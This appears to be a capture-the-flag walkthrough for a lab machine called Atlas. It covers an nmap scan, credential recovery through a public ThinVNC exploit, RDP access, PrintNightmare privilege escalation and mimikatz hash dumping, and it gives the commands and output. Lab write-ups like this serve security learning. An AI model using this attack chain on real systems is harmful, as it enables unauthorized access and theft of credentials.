# Atlas v1.4

## Enumeration

### NMAP Scan 

Check for running services and open ports.

```bash 
nmap -p- -Pn -sC -sV -A -vv -oN nmap.scan IPaddr
```

I realized after I ran the above command that I didn't need the `-A`. I changed my mind half way through typing it and didn't remove the `-A`.
__*Ports*__
* 3389 Windows RDP
* 8080 ThinVNC

## Exploits

### Access - ThinVNC Exploit
> by Muirland Oracle

https://github.com/MuirlandOracle/CVE-2019-17662

[+] Credentials Found!
Username:       [REDACTED]
Password:       [REDACTED]

Now we can log into the ThinVNC service on port 8080. But since we have credentials, let's move into the Windows native RDP for a better interactive interface. 
```bash
xfreerdp /v:IPaddr /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
```

### Privilege Escalation - PrintNightmare
> by Caleb Stewart and John Hammond

https://github.com/calebstewart/CVE-2021-1675

### Post Exploitation - Mimikatz

Use this exploit to dump password hashes. Download mimikatz, move mimkatz to the tmp directory, and unzip the archive.
```bash
cd /tmp
mv ~/Downloads/mimikatz_trunk.zip .
unzip mimikatz_trunk.zip
```
Go back to the target computer. In RDP session use the elevated Command Shell to launch the exploit:
```bash
\\tsclient\share\mimikatz_trunk\x64\mimikatz.exe
```

If all goes well you get some nice ASCII art and a new mimikatz prompt. 

Before we run it, we usually need to execute two commands before dumping the hashes:
* `privilege::debug` - this obtains debug privileges which allows us to access other processes for "debuging" purposes.
* `token::elevate` - simply put, this takes us from our administrative shell with high privileges into a `SYSTEM` level shell with maximum privileges. This is something that we have a *right* to do as an administrator, but that is not usually possible using normal Windows operations

There are several commands that can be used to dump the hashes. We will use: `lsadump::sam`.
```bash
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

---

mimikatz # lsadump::sam
Domain : GAIA
SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821
Local SID : S-1-5-21-1966530601-3185510712-10604624

SAMKey : 6e708461100b4988991ce3b4d8b1784e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: [REDACTED]
```
